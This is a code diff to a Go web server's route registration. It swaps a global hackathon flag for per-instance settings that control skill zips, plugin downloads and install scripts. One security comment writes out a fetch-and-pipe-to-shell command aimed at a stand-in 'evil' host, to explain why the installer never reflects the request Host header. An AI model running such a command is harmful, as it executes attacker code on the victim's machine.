@@ -80,7 +80,7 @@ var (
 
 func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler) {
 	registerPhotosUI(mux, publicBaseURL)
-	mux.HandleFunc("GET /auth.md", serveAuthMarkdown)
+	mux.HandleFunc("GET /auth.md", sh.serveAuthMarkdown)
 	// The connector's page recipes (get_page_recipe), for agents that read
 	// llms.txt without the connector: the same text, with a placeholder site.
 	mux.HandleFunc("GET /recipes/{topic}", func(w http.ResponseWriter, r *http.Request) {
@@ -100,13 +100,13 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 		_, _ = w.Write(body)
 	})
 	sub, _ := fs.Sub(staticFiles, "static")
-	fileServer := hostDiagram(http.FileServerFS(handlerOnlyFS{sub}))
+	fileServer := hostDiagram(sh.ed.Routes().HostedEvents, http.FileServerFS(handlerOnlyFS{sub}))
 	staticServer := fileServer
 	fileServer = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		name := strings.TrimPrefix(r.URL.Path, "/")
 		if name != "" {
 			if _, err := fs.Stat(handlerOnlyFS{sub}, name); err != nil {
-				if hackMode {
+				if sh.ed.Routes().HostedEvents {
 					sh.renderNotFound(w, r, r.URL.Path)
 				} else {
 					sh.renderNotFoundPage(w, r, "Page not found", "The page you’re looking for doesn’t exist.", "/", "Go to simple-host.app")
@@ -123,7 +123,7 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	// untouched rather than merely equivalent.
 	if assetsRewritten() {
 		for _, name := range rewrittenAssets {
-			if name == "openapi.yaml" || name == "openapi.json" || hackMode && name == "install.html" {
+			if name == "openapi.yaml" || name == "openapi.json" || sh.ed.Routes().HostedEvents && name == "install.html" {
 				continue
 			}
 			mux.Handle("GET /"+name, serveRewrittenAsset(name, instanceHosts, skillsModTime))
@@ -132,7 +132,7 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	for _, name := range []string{"openapi.yaml", "openapi.json"} {
 		mux.Handle("GET /"+name, serveRewrittenAsset(name, instanceHosts, skillsModTime))
 	}
-	if hackMode {
+	if sh.ed.Routes().HostedEvents {
 		mux.Handle("GET /install.html", http.RedirectHandler("/get-started", http.StatusFound))
 		mux.Handle("GET /docs.html", adminUICSP(serveStaticPage("docs.html")))
 	}
@@ -144,11 +144,11 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 		mux.Handle("GET /"+name, serveIcon(sub, file))
 	}
 
-	mux.HandleFunc("GET /robots.txt", serveRobotsTxt)
-	mux.HandleFunc("GET /sitemap.xml", serveSitemapXML)
-	mux.HandleFunc("GET /.well-known/ard.json", discoveryDocument("ard.json", "application/json", publicBaseURL))
-	mux.HandleFunc("GET /.well-known/api-catalog", discoveryDocument("api-catalog", `application/linkset+json;profile="https://www.rfc-editor.org/info/rfc9727"`, publicBaseURL))
-	mux.HandleFunc("GET /skills.zip", serveSkillsZip)
+	mux.HandleFunc("GET /robots.txt", func(w http.ResponseWriter, r *http.Request) { serveRobotsTxt(w, r, sh.ed.Routes().HostedEvents) })
+	mux.HandleFunc("GET /sitemap.xml", func(w http.ResponseWriter, r *http.Request) { serveSitemapXML(w, r, sh.ed.Routes().HostedEvents) })
+	mux.HandleFunc("GET /.well-known/ard.json", discoveryDocument(sh.ed.Presentation().HackAssets, "ard.json", "application/json", publicBaseURL))
+	mux.HandleFunc("GET /.well-known/api-catalog", discoveryDocument(sh.ed.Presentation().HackAssets, "api-catalog", `application/linkset+json;profile="https://www.rfc-editor.org/info/rfc9727"`, publicBaseURL))
+	mux.HandleFunc("GET /skills.zip", func(w http.ResponseWriter, r *http.Request) { serveSkillsZip(w, r, sh.ed.Presentation().HackAssets) })
 	mux.HandleFunc("GET /skills/version", serveSkillsVersion)
 	// The landing film's video and poster files (film.go).
 	mux.HandleFunc("GET /film/{file}", serveFilm)
@@ -165,9 +165,9 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 			serveSkillReference(w, r)
 		})
 	}
-	mux.HandleFunc("GET /plugin.zip", servePluginZip)
-	mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL))
-	mux.HandleFunc("GET /install.ps1", serveInstallPowerShell(publicBaseURL))
+	mux.HandleFunc("GET /plugin.zip", func(w http.ResponseWriter, r *http.Request) { servePluginZip(w, r, sh.ed.Presentation().HackAssets) })
+	mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL, sh.ed.Presentation().HackAssets))
+	mux.HandleFunc("GET /install.ps1", serveInstallPowerShell(publicBaseURL, sh.ed.Presentation().HackAssets))
 	// Admin dashboard: all signed-up users + their sites. This shell is public —
 	// a browser navigation carries no API key, so it cannot be gated server-side.
 	// It renders nothing until /v1/admin/users answers, and that IS gated; a
@@ -180,7 +180,7 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	// What Simple Host costs and its real limits, generated from this
 	// install's own settings; agents looking for a plans or pricing page
 	// land here instead of finding none (SIM-190).
-	mux.Handle("GET /pricing", adminUICSP(serveStaticPage("pricing.html")))
+	mux.Handle("GET /pricing", adminUICSP(serveStaticPage("pricing.html", sh.ed.Routes().HostedEvents)))
 	// Marketing pages, one per audience, shared as direct links.
 	mux.Handle("GET /enterprise", adminUICSP(serveStaticPage("enterprise.html")))
 	mux.Handle("GET /enterprise/brief", adminUICSP(serveStaticPage("enterprise-brief.html")))
@@ -213,12 +213,12 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	// with a session it goes straight through to the owner's app, without one it
 	// is the sign-in screen. index.html is not in rewrittenAssets, so serving it
 	// raw here matches what the file server would hand back at "/".
-	if hackMode {
+	if sh.ed.Routes().HostedEvents {
 		// The hackathon platform has no sites dashboard: a signed-in person's
 		// place is their events (RegisterHackUI's app shell, static/hack/app.html).
 		mux.Handle("GET /dashboard", http.RedirectHandler("/events", http.StatusFound))
 	} else {
-		markdown := homepageMarkdownHandler(publicBaseURL)
+		markdown := homepageMarkdownHandler(publicBaseURL, sh.ed.Presentation().HackAssets)
 		mux.HandleFunc("GET /index.md", markdown)
 		mux.HandleFunc("GET /llms.md", markdown)
 		mux.Handle("GET /dashboard", adminUICSP(serveStaticPage("index.html")))
@@ -325,7 +325,7 @@ func (f handlerOnlyFS) Open(name string) (fs.File, error) {
 // serveStaticPage serves one embedded HTML page at a fixed route, for pages that
 // need a clean URL rather than the .html the file server would expose. The
 // shared chrome is filled in here; see chrome.go.
-func serveStaticPage(name string) http.Handler {
+func serveStaticPage(name string, pricingHostedEvents ...bool) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		body, err := chromePage(name, chromeDataFor(r, ""))
 		if err != nil {
@@ -336,7 +336,7 @@ func serveStaticPage(name string) http.Handler {
 			body = hackInstanceText(hackDocsHTML(body))
 		}
 		if name == "pricing.html" {
-			body = applyPricingNumbers(body)
+			body = applyPricingNumbers(body, len(pricingHostedEvents) > 0 && pricingHostedEvents[0])
 		}
 		if hackMode && name == "hack-get-started.html" && hackInkBaseURL != "https://simple-hack.app" {
 			// GitHub skills name the hosted service. Install the local ZIP instead.
@@ -428,8 +428,8 @@ func serveSkillsVersion(w http.ResponseWriter, r *http.Request) {
 
 // serveSkillsZip returns a flat zip of the skill folders, suitable for
 // extraction directly into ~/.claude/skills or ~/.agents/skills.
-func serveSkillsZip(w http.ResponseWriter, r *http.Request) {
-	if hackMode {
+func serveSkillsZip(w http.ResponseWriter, r *http.Request, hackAssets bool) {
+	if hackAssets {
 		serveHackSkillsZip(w, r)
 		return
 	}
@@ -490,8 +490,8 @@ func serveSkillMarkdown(skillName string) http.HandlerFunc {
 
 // servePluginZip returns the wrapped plugin layout (.claude-plugin/plugin.json
 // + skills/<name>/SKILL.md), suitable for `claude --plugin-url <url>`.
-func servePluginZip(w http.ResponseWriter, r *http.Request) {
-	if hackMode {
+func servePluginZip(w http.ResponseWriter, r *http.Request, hackAssets bool) {
+	if hackAssets {
 		http.Error(w, "this legacy plugin download was withdrawn", http.StatusGone)
 		return
 	}
@@ -516,10 +516,10 @@ func servePluginZip(w http.ResponseWriter, r *http.Request) {
 // `sh`, so reflecting an attacker-controlled Host header would let a crafted
 // request produce a `curl https://evil/skills.zip | sh` (remote code execution
 // on the victim). PublicBaseURL already carries the correct https scheme.
-func serveInstallScript(publicBaseURL string) http.HandlerFunc {
+func serveInstallScript(publicBaseURL string, hackAssets bool) http.HandlerFunc {
 	base := strings.TrimRight(publicBaseURL, "/")
 	return func(w http.ResponseWriter, r *http.Request) {
-		if hackMode {
+		if hackAssets {
 			http.Error(w, "this installer was withdrawn", http.StatusGone)
 			return
 		}
@@ -571,10 +571,10 @@ echo "Restart your agent if it caches the skills directory."
 // Same RCE reasoning as serveInstallScript — the download base is the
 // server-configured PublicBaseURL, never the request Host, because this is
 // meant to be run as `irm …/install.ps1 | iex`.
-func serveInstallPowerShell(publicBaseURL string) http.HandlerFunc {
+func serveInstallPowerShell(publicBaseURL string, hackAssets bool) http.HandlerFunc {
 	base := strings.TrimRight(publicBaseURL, "/")
 	return func(w http.ResponseWriter, r *http.Request) {
-		if hackMode {
+		if hackAssets {
 			http.Error(w, "this installer was withdrawn", http.StatusGone)
 			return
 		}
